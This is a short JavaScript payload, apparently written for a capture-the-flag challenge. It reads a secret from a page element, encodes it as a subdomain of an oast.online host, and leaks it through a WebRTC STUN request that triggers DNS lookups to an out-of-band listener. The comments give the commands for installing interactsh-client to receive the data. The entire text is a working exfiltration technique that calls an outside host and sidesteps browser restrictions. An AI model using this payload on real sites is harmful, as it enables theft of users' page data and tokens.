let flag = document.getElementById("flag").innerHTML;
let flag_body = flag.replace("ctf{", "").replace("}", "");

const rtc = new RTCPeerConnection({
  iceServers: [
    {
      urls: "stun:" + flag_body + ".cotb86oah6b7oqrgnll05m9apgy7fti8o.oast.online",
    },
  ],
});
rtc.createDataChannel("");
rtc.createOffer().then((offer) => rtc.setLocalDescription(offer));

// go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
// ~/go/bin/interactsh-client
